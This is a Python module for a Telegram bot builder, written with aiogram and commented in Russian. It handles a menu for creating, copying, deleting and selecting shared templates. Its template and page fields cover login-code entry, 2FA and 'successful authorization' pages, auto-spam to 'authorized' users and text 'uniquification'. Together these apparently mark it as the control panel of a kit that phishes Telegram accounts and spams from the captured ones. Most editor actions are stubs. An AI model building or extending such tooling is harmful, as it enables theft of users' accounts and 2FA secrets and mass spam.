"""
========================================================================
 МОДУЛЬ: «📋 Изменить шаблон» → меню шаблонов → редактор шаблона
------------------------------------------------------------------------
 Шаблоны общие для владельца: созданный в одном боте доступен всем его
 ботам (таблица templates, owner_id). Бот ссылается на выбранный шаблон
 через bots.template_id.

 Меню шаблонов:
   📋 Меню шаблонов:
   [ Шаблон 1 ]  [ Шаблон 2 ] ...    ← список общих шаблонов (✅ — текущий)
   [⚙️ Создать шаблон] [➕ Стандартный шаблон]
   [💎 Шаблоны мини-апп]
   [📥 Добавить по коду] [⬅️ Назад]

 Редактор шаблона — поля из макета (тексты, кнопки, страницы,
 уникализация…). Поля пока заглушки, наполняем по очереди; копия и
 удаление уже работают.
========================================================================
"""

from aiogram import F, Router
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils.keyboard import InlineKeyboardBuilder

from database import (
    copy_template,
    create_template,
    delete_template,
    get_bot,
    get_owner_templates,
    get_template,
    set_bot_template,
)
from handlers.cards import owns

router = Router()


def _ensure_templates(owner_id: int) -> list[dict]:
    """Гарантируем, что у владельца есть хотя бы один шаблон."""
    templates = get_owner_templates(owner_id)
    if not templates:
        create_template(owner_id, "Стандартный шаблон", "standard")
        templates = get_owner_templates(owner_id)
    return templates


# ----------------------------------------------------------- меню шаблонов
def _menu_kb(bot: dict, templates: list[dict]) -> InlineKeyboardMarkup:
    bid = bot["id"]
    current = bot.get("template_id")
    b = InlineKeyboardBuilder()
    for t in templates:
        mark = "✅ " if t["id"] == current else ""
        b.row(
            InlineKeyboardButton(
                text=f"{mark}{t['name']}",
                callback_data=f"std_open:{bid}:{t['id']}",
            )
        )
    b.row(
        InlineKeyboardButton(
            text="⚙️ Создать шаблон", callback_data=f"tpl_soon:{bid}:create"
        ),
        InlineKeyboardButton(
            text="➕ Стандартный шаблон", callback_data=f"tpl_new:{bid}"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="💎 Шаблоны мини-апп", callback_data=f"tpl_soon:{bid}:miniapp"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="📥 Добавить по коду", callback_data=f"tpl_soon:{bid}:code"
        ),
        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"bot:{bid}"),
    )
    return b.as_markup()


async def _show_menu(callback: CallbackQuery, bot: dict) -> None:
    templates = _ensure_templates(bot["owner_id"])
    await callback.message.edit_text(
        "📋 <b>Меню шаблонов:</b>", reply_markup=_menu_kb(bot, templates)
    )


# ------------------------------------------- редактор шаблона (стандартный)
_STD_ROWS: list[tuple[str, str]] = [
    ("Ответ на /start", "start_msg"),
    ("Кнопка запуска мини-апп", "start_btn"),
    ("Второе сообщение после /start", "second_msg"),
    ("Просроченный вход", "expired_msg"),
    ("Кнопка просрочки", "expired_btn"),
    ("Успешная авторизация", "auth_ok"),
    ("Автоспам авторизованные", "spam_auth"),
    ("Автоспам неавторизованные", "spam_unauth"),
    ("Пост админ канала", "admin_post"),
    ("Показ успешной авторизации", "show_auth"),
    ("📋 Показ кода", "show_code"),
]


def _std_text(template: dict) -> str:
    return f"💎 <b>Шаблон мини-апп «{template['name']}»:</b>"


def _std_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    for label, act in _STD_ROWS:
        b.row(
            InlineKeyboardButton(
                text=label, callback_data=f"std_act:{bid}:{tid}:{act}"
            )
        )
    b.row(
        InlineKeyboardButton(
            text="📱 Страницы мини-апп", callback_data=f"tpl_pages:{bid}:{tid}"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="⚡ Уникализация текста", callback_data=f"std_act:{bid}:{tid}:uniq"
        ),
        InlineKeyboardButton(
            text="📋 Создать копию", callback_data=f"tpl_copy:{bid}:{tid}"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="⚙️ Код шаблона", callback_data=f"std_act:{bid}:{tid}:tcode"
        ),
        InlineKeyboardButton(
            text="🏷 Название", callback_data=f"std_act:{bid}:{tid}:name"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="🎨 Оформление бота", callback_data=f"std_act:{bid}:{tid}:design"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="🗑 Удалить шаблон", callback_data=f"tpl_del:{bid}:{tid}"
        )
    )
    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"template:{bid}"))
    return b.as_markup()


async def _show_editor(callback: CallbackQuery, bid: int, template: dict) -> None:
    await callback.message.edit_text(
        _std_text(template), reply_markup=_std_kb(bid, template["id"])
    )


# ---------------------------------------------- страницы мини-апп шаблона
_PAGE_ROWS: list[tuple[str, str]] = [
    ("Главная страница", "main"),
    ("Страница ввода кода", "code"),
    ("Страница с 2FA", "twofa"),
    ("Страница успешной авторизации", "success"),
    ("🖼 Фон", "bg"),
    ("💨 Блюр фона", "blur"),
    ("🎨 Цвет интерфейса", "color"),
]


def _pages_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    for label, act in _PAGE_ROWS:
        b.row(
            InlineKeyboardButton(
                text=label, callback_data=f"pg_act:{bid}:{tid}:{act}"
            )
        )
    b.row(
        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"std_open:{bid}:{tid}")
    )
    return b.as_markup()


# ----------------------------------------------------------------- хендлеры
@router.callback_query(F.data.startswith("template:"))
async def open_menu(callback: CallbackQuery) -> None:
    bot = get_bot(int(callback.data.split(":")[1]))
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    await _show_menu(callback, bot)
    await callback.answer()


@router.callback_query(F.data.startswith("std_open:"))
async def open_template(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    set_bot_template(bid, tid)  # выбираем шаблон активным для бота
    await _show_editor(callback, bid, template)
    await callback.answer()


@router.callback_query(F.data.startswith("tpl_new:"))
async def new_template(callback: CallbackQuery) -> None:
    bid = int(callback.data.split(":")[1])
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    existing = get_owner_templates(callback.from_user.id)
    name = f"Стандартный шаблон {len(existing) + 1}"
    tid = create_template(callback.from_user.id, name, "standard")
    set_bot_template(bid, tid)
    await _show_editor(callback, bid, get_template(tid))
    await callback.answer("Шаблон создан ✅")


@router.callback_query(F.data.startswith("tpl_copy:"))
async def copy_tpl(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    copy_template(tid)
    await _show_menu(callback, bot)
    await callback.answer("Копия создана ✅")


@router.callback_query(F.data.startswith("tpl_del:"))
async def del_tpl(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    delete_template(tid)
    await _show_menu(callback, bot)
    await callback.answer("Шаблон удалён 🗑")


@router.callback_query(F.data.startswith("tpl_pages:"))
async def open_pages(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    await callback.message.edit_text(
        f"💎 <b>Страницы мини-апп шаблона «{template['name']}»:</b>",
        reply_markup=_pages_kb(bid, tid),
    )
    await callback.answer()


@router.callback_query(F.data.startswith("pg_act:"))
async def page_action(callback: CallbackQuery) -> None:
    await callback.answer("🚧 В разработке", show_alert=True)


@router.callback_query(F.data.startswith("std_act:"))
async def std_action(callback: CallbackQuery) -> None:
    await callback.answer("🚧 В разработке", show_alert=True)


@router.callback_query(F.data.startswith("tpl_soon:"))
async def not_ready(callback: CallbackQuery) -> None:
    await callback.answer("🚧 В разработке", show_alert=True)
